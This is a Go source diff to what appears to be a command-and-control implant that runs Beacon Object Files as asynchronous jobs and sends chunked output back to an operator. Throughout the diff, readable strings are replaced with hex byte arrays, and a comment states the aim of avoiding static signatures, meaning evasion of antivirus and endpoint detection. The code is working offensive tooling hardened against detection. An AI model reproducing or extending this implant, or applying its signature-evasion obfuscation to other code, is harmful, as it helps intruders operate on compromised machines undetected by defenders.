@@ -14,6 +14,52 @@ import (
 	"time"
 )
 
+// BOF async strings (constructed to avoid static signatures)
+var (
+	// Job status values
+	bofStatusRunning   = string([]byte{0x72, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67})                               // running
+	bofStatusCompleted = string([]byte{0x63, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64})                   // completed
+	bofStatusCrashed   = string([]byte{0x63, 0x72, 0x61, 0x73, 0x68, 0x65, 0x64})                               // crashed
+	bofStatusKilled    = string([]byte{0x6b, 0x69, 0x6c, 0x6c, 0x65, 0x64})                                     // killed
+	bofStatusTimeout   = string([]byte{0x74, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74})                               // timeout
+
+	// Command names
+	bofCmdAsyncStatus = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73}) // bof-async-status
+	bofCmdAsyncOutput = string([]byte{0x62, 0x6f, 0x66, 0x2d, 0x61, 0x73, 0x79, 0x6e, 0x63, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74}) // bof-async-output
+
+	// Output prefixes and markers
+	bofAsyncStarted = string([]byte{0x42, 0x4f, 0x46, 0x5f, 0x41, 0x53, 0x59, 0x4e, 0x43, 0x5f, 0x53, 0x54, 0x41, 0x52, 0x54, 0x45, 0x44}) // BOF_ASYNC_STARTED
+	bofAsyncPrefix  = string([]byte{0x42, 0x4f, 0x46, 0x5f, 0x41, 0x53, 0x59, 0x4e, 0x43, 0x5f})                                           // BOF_ASYNC_
+	bofChunkPrefix  = string([]byte{0x7c, 0x43, 0x48, 0x55, 0x4e, 0x4b, 0x5f})                                                             // |CHUNK_
+
+	// Final status markers (uppercase)
+	bofFinalCompleted = string([]byte{0x43, 0x4f, 0x4d, 0x50, 0x4c, 0x45, 0x54, 0x45, 0x44})       // COMPLETED
+	bofFinalCrashed   = string([]byte{0x43, 0x52, 0x41, 0x53, 0x48, 0x45, 0x44})                   // CRASHED
+	bofFinalKilled    = string([]byte{0x4b, 0x49, 0x4c, 0x4c, 0x45, 0x44})                         // KILLED
+	bofFinalTimeout   = string([]byte{0x54, 0x49, 0x4d, 0x45, 0x4f, 0x55, 0x54})                   // TIMEOUT
+	bofFinalOutput    = string([]byte{0x4f, 0x55, 0x54, 0x50, 0x55, 0x54})                         // OUTPUT
+
+	// Chunk separator
+	bofChunkSeparator = string([]byte{0x0a, 0x2d, 0x2d, 0x2d, 0x43, 0x48, 0x55, 0x4e, 0x4b, 0x5f, 0x53, 0x45, 0x50, 0x41, 0x52, 0x41, 0x54, 0x4f, 0x52, 0x2d, 0x2d, 0x2d, 0x0a}) // \n---CHUNK_SEPARATOR---\n
+
+	// Misc
+	bofTruncYes  = string([]byte{0x59, 0x45, 0x53}) // YES
+	bofTruncDots = string([]byte{0x2e, 0x2e, 0x2e}) // ...
+	bofPipeSep   = string([]byte{0x7c})             // |
+
+	// Output messages for executeBOFGetOutput
+	bofTruncatedMsg    = string([]byte{0x20, 0x28, 0x4f, 0x55, 0x54, 0x50, 0x55, 0x54, 0x20, 0x54, 0x52, 0x55, 0x4e, 0x43, 0x41, 0x54, 0x45, 0x44, 0x20, 0x2d, 0x20, 0x65, 0x78, 0x63, 0x65, 0x65, 0x64, 0x65, 0x64, 0x20, 0x31, 0x30, 0x4d, 0x42, 0x20, 0x6c, 0x69, 0x6d, 0x69, 0x74, 0x29})                                     //  (OUTPUT TRUNCATED - exceeded 10MB limit)
+	bofJobPrefix       = string([]byte{0x4a, 0x6f, 0x62, 0x20})                                                                                                                                                                                                                                                                     // Job
+	bofStillRunning    = string([]byte{0x20, 0x69, 0x73, 0x20, 0x73, 0x74, 0x69, 0x6c, 0x6c, 0x20, 0x72, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67, 0x0a})                                                                                                                                                                                 //  is still running\n
+	bofChunksSent      = string([]byte{0x43, 0x68, 0x75, 0x6e, 0x6b, 0x73, 0x20, 0x73, 0x65, 0x6e, 0x74, 0x3a, 0x20})                                                                                                                                                                                                               // Chunks sent:
+	bofSpaceParen      = string([]byte{0x20, 0x28})                                                                                                                                                                                                                                                                                 //  (
+	bofNoBufferedOut   = string([]byte{0x29, 0x20, 0x68, 0x61, 0x73, 0x20, 0x6e, 0x6f, 0x20, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x65, 0x64, 0x20, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x0a})                                                                                                                                       // ) has no buffered output\n
+	bofOutputForJob    = string([]byte{0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x20, 0x66, 0x6f, 0x72, 0x20, 0x6a, 0x6f, 0x62, 0x20})                                                                                                                                                                                                   // Output for job
+	bofChunksSentParen = string([]byte{0x20, 0x28, 0x63, 0x68, 0x75, 0x6e, 0x6b, 0x73, 0x20, 0x73, 0x65, 0x6e, 0x74, 0x3a, 0x20})                                                                                                                                                                                                   //  (chunks sent:
+	bofCloseColonNL    = string([]byte{0x29, 0x3a, 0x0a})                                                                                                                                                                                                                                                                           // ):\n
+	bofCloseParen      = string([]byte{0x29})                                                                                                                                                                                                                                                                                       // )
+)
+
 // Constants for output management - OPTIMIZED VALUES
 const (
 	MAX_OUTPUT_CHUNK_SIZE = 100 * 1024       // 100KB per chunk (was 20KB)
@@ -212,7 +258,7 @@ func executeBOFAsyncPlatform(cmd Command, bofBytes []byte, args []byte) CommandR
 		CommandDBID:  cmd.CommandDBID,
 		AgentID:      cmd.AgentID,
 		Name:         cmd.Filename,
-		Status:       "running",
+		Status:       bofStatusRunning,
 		StartTime:    time.Now(),
 		BOFBytes:     bofBytes,
 		Args:         args,
@@ -232,7 +278,7 @@ func executeBOFAsyncPlatform(cmd Command, bofBytes []byte, args []byte) CommandR
 	// Return immediate response
 	return CommandResult{
 		Command:  cmd,
-		Output:   fmt.Sprintf("BOF_ASYNC_STARTED|%s|%s", jobID, cmd.Filename),
+		Output:   bofAsyncStarted + bofPipeSep + jobID + bofPipeSep + cmd.Filename,
 		ExitCode: 0,
 		JobID:    jobID,
 	}
@@ -243,7 +289,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 	defer func() {
 		if r := recover(); r != nil {
 			job.OutputMutex.Lock()
-			job.Status = "crashed"
+			job.Status = bofStatusCrashed
 			job.Error = fmt.Errorf(ErrCtx(E51, fmt.Sprintf("%v", r)))
 			endTime := time.Now()
 			job.EndTime = &endTime
@@ -257,10 +303,10 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 	}()
 
 	// Send start notification through ResultManager
-	startMsg := fmt.Sprintf("BOF_ASYNC_STARTED|%s|%s", job.ID, job.Name)
+	startMsg := bofAsyncStarted + bofPipeSep + job.ID + bofPipeSep + job.Name
 	startResult := &CommandResult{
 		Command: Command{
-			Command:     "bof-async-status",
+			Command:     bofCmdAsyncStatus,
 			CommandID:   job.CommandID,
 			CommandDBID: job.CommandDBID,
 			AgentID:     job.AgentID,
@@ -338,7 +384,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 						shouldChunk = true
 					}
 
-					if shouldChunk && job.Status == "running" {
+					if shouldChunk && job.Status == bofStatusRunning {
 						chunk := job.Output.String()
 						job.Output.Reset()
 						job.OutputMutex.Unlock()
@@ -355,7 +401,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 			case <-flushTimer.C:
 				// Force flush any accumulated output
 				job.OutputMutex.Lock()
-				if job.Output.Len() > 0 && job.Status == "running" {
+				if job.Output.Len() > 0 && job.Status == bofStatusRunning {
 					size := job.Output.Len()
 					chunk := job.Output.String()
 					job.Output.Reset()
@@ -481,11 +527,11 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		}
 
 		if result.err != nil {
-			job.Status = "crashed"
+			job.Status = bofStatusCrashed
 			job.Error = result.err
 			job.Output.WriteString("\n" + Err(E51) + "\n")
 		} else {
-			job.Status = "completed"
+			job.Status = bofStatusCompleted
 		}
 
 		endTime := time.Now()
@@ -502,7 +548,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		<-outputDone
 
 		job.OutputMutex.Lock()
-		job.Status = "killed"
+		job.Status = bofStatusKilled
 		endTime := time.Now()
 		job.EndTime = &endTime
 		job.Output.WriteString("\n" + Succ(S16) + "\n")
@@ -517,7 +563,7 @@ func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
 		<-outputDone
 
 		job.OutputMutex.Lock()
-		job.Status = "timeout"
+		job.Status = bofStatusTimeout
 		endTime := time.Now()
 		job.EndTime = &endTime
 		job.Output.WriteString("\n" + Err(E9) + "\n")
@@ -551,35 +597,34 @@ func (bjm *BOFJobManager) queueOutputChunk(job *BOFJob, output string, isFinal b
 		var status string
 		if isFinal && i == len(chunks)-1 {
 			switch job.Status {
-			case "completed":
-				status = "COMPLETED"
-			case "crashed":
-				status = "CRASHED"
-			case "killed":
-				status = "KILLED"
-			case "timeout":
-				status = "TIMEOUT"
+			case bofStatusCompleted:
+				status = bofFinalCompleted
+			case bofStatusCrashed:
+				status = bofFinalCrashed
+			case bofStatusKilled:
+				status = bofFinalKilled
+			case bofStatusTimeout:
+				status = bofFinalTimeout
 			default:
-				status = "COMPLETED"
+				status = bofFinalCompleted
 			}
 		} else {
-			status = "OUTPUT"
+			status = bofFinalOutput
 		}
 
 		// Create the output message
-		outputMessage := fmt.Sprintf("BOF_ASYNC_%s|%s|CHUNK_%d|%s",
-			status, job.ID, job.ChunkIndex, chunk)
+		outputMessage := bofAsyncPrefix + status + bofPipeSep + job.ID + bofChunkPrefix + fmt.Sprintf("%d", job.ChunkIndex) + bofPipeSep + chunk
 
 		batchedChunks = append(batchedChunks, outputMessage)
 
 		// Send batch when full or on last chunk
 		if len(batchedChunks) >= BATCH_SIZE || (isFinal && i == len(chunks)-1) {
 			// Combine batched chunks into single result
-			combinedOutput := strings.Join(batchedChunks, "\n---CHUNK_SEPARATOR---\n")
+			combinedOutput := strings.Join(batchedChunks, bofChunkSeparator)
 
 			result := &CommandResult{
 				Command: Command{
-					Command:     "bof-async-output",
+					Command:     bofCmdAsyncOutput,
 					CommandID:   job.CommandID,
 					CommandDBID: job.CommandDBID,
 					AgentID:     job.AgentID,
@@ -640,7 +685,7 @@ func executeBOFJobsList() CommandResult {
 
 		truncated := ""
 		if job.OutputTruncated {
-			truncated = "YES"
+			truncated = bofTruncYes
 		}
 
 		output.WriteString(fmt.Sprintf("%-24s | %-19s | %-11s | %-8s | %-6d | %s\n",
@@ -664,7 +709,7 @@ func truncateString(s string, maxLen int) string {
 		return s
 	}
 	if maxLen > 3 {
-		return s[:maxLen-3] + "..."
+		return s[:maxLen-3] + bofTruncDots
 	}
 	return s[:maxLen]
 }
@@ -698,20 +743,20 @@ func executeBOFGetOutput(jobID string) CommandResult {
 
 	truncatedMsg := ""
 	if truncated {
-		truncatedMsg = " (OUTPUT TRUNCATED - exceeded 10MB limit)"
+		truncatedMsg = bofTruncatedMsg
 	}
 
 	if output == "" {
-		if status == "running" {
-			output = fmt.Sprintf("Job %s is still running\nChunks sent: %d%s",
-				matchedJob.ID, chunks, truncatedMsg)
+		if status == bofStatusRunning {
+			// Job <id> is still running\nChunks sent: <n><truncatedMsg>
+			output = bofJobPrefix + matchedJob.ID + bofStillRunning + bofChunksSent + fmt.Sprintf("%d", chunks) + truncatedMsg
 		} else {
-			output = fmt.Sprintf("Job %s (%s) has no buffered output\nChunks sent: %d%s",
-				matchedJob.ID, status, chunks, truncatedMsg)
+			// Job <id> (<status>) has no buffered output\nChunks sent: <n><truncatedMsg>
+			output = bofJobPrefix + matchedJob.ID + bofSpaceParen + status + bofNoBufferedOut + bofChunksSent + fmt.Sprintf("%d", chunks) + truncatedMsg
 		}
 	} else {
-		output = fmt.Sprintf("Output for job %s (chunks sent: %d)%s:\n%s",
-			matchedJob.ID, chunks, truncatedMsg, output)
+		// Output for job <id> (chunks sent: <n>)<truncatedMsg>:\n<output>
+		output = bofOutputForJob + matchedJob.ID + bofChunksSentParen + fmt.Sprintf("%d", chunks) + bofCloseParen + truncatedMsg + bofCloseColonNL + output
 	}
 
 	return CommandResult{
@@ -741,7 +786,7 @@ func executeBOFKillJob(jobID string) CommandResult {
 		}
 	}
 
-	if matchedJob.Status != "running" {
+	if matchedJob.Status != bofStatusRunning {
 		return CommandResult{
 			Output:      ErrCtx(E25, matchedJob.Status),
 			ExitCode:    1,
@@ -786,7 +831,7 @@ func (bjm *BOFJobManager) CleanupOldJobs(maxAge time.Duration) {
 
 	now := time.Now()
 	for id, job := range bjm.jobs {
-		if job.Status != "running" && job.EndTime != nil {
+		if job.Status != bofStatusRunning && job.EndTime != nil {
 			if now.Sub(*job.EndTime) > maxAge {
 				delete(bjm.jobs, id)
 			}
